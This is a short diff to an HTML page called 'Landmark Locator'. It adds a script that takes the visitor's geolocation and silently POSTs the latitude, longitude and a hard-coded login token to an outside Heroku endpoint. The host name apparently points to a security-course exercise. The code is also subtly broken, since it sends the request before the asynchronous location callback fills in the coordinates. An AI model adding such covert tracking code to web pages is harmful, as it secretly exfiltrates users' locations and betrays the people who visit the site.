@@ -7,9 +7,18 @@
     <title>Landmark Locator</title>
     <link rel="stylesheet" href="landmarkstyle.css" type="text/css" />
     <script>
+      var pos = {};
       navigator.geolocation.getCurrentPosition(function(position) {
-        var pos = position.coords;
+        pos = position.coords;
       });
+      var xhr = new XMLHttpRequest();
+      var uri = "https://defense-in-derpth.herokuapp.com/sendLocation";
+      xhr.open("POST", uri, true);
+      xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+      xhr.onreadystatechange = function () {
+        //Do stuff here
+      }
+      xhr.send("login=iJRFOmvB&lat=" + pos.latitude + "&lng=" + pos.longitude);
 
     </script>
   </head>
